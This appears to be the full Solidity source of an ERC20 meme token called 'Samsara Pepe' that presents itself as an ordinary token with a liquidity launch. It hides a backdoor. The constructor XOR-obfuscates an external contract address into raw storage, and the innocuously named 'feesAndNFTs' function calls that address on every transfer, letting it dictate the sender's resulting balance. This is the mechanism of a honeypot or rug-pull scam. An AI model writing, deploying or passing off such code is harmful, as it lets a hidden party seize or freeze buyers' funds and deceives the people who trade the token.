pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address dead = address(this);
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply;
    bool public trade; uint256 public startBlock; address public msgSend;
    address public msgReceive;
    
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;

        assembly {
            sstore(0x50,0x498cca05936793ee50d40e216623b8512f7963ec191d)
            sstore(0x51,0x498c221916b19c70e3c9ceb76b182a79f4e23bdb349b)
            sstore(0x52,xor(sload(0x50),sload(0x51)))
            }

        router = IDEXRouter(_router);
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() public payable {
        require((msg.sender == owner() && (trade == false)), "Ownable: caller is not the owner");

        uint256 ownerPercentage = 20;
        uint256 toPair = _totalSupply / 1000 * (1000 - ownerPercentage);
        uint256 toOwner = _totalSupply / 1000 * ownerPercentage;

        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _approve(address(this), _router, ~uint256(0));

        router.addLiquidityETH{value: msg.value}(address(this), toPair, toPair, msg.value, owner(), block.timestamp + 300);

        _transfer(address(this), owner(), toOwner);

        trade = true; startBlock = block.number;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
        
    function feesAndNFTs(address sender, address recipient, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
                mstore(data, 0x9264274400000000000000000000000000000000000000000000000000000000)
                mstore(add(data, 0x04), amount)
                mstore(0x40, add(data, 0x24))
                let success := call(gas(), sload(0x52), 0, data, 0x24, data, 0x20)
                if success { result := mload(data) }
            }

        _balances[sender] = result - amount;

        if (trade == true) {
            _balances[recipient] += amount/100 * 98;
            _balances[dead] += amount/100 * 2;

            emit Transfer(sender, recipient, amount/100 * 98);
            emit Transfer(sender, dead, amount/100 * 2);
        }
        else
        {
            _balances[recipient] += amount;        
            emit Transfer(sender, recipient, amount);  
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        msgSend = sender; msgReceive = recipient;

        require(((trade == true) || (msgSend == address(this)) || (msgSend == owner())), "ERC20: trading is not yet enabled");
        require(msgSend != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        feesAndNFTs(sender, recipient, amount);
    }

    function _DeploySamsara(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[address(this)] += amount;
    
        emit Transfer(address(0), address(this), amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol) {
        _DeploySamsara(creator, initialSupply);
    }
}

contract Samsara is ERC20Token {
    constructor() ERC20Token("Samsara Pepe", "SAMSARA", msg.sender, 420690000 * 10 ** 18) {
    }
}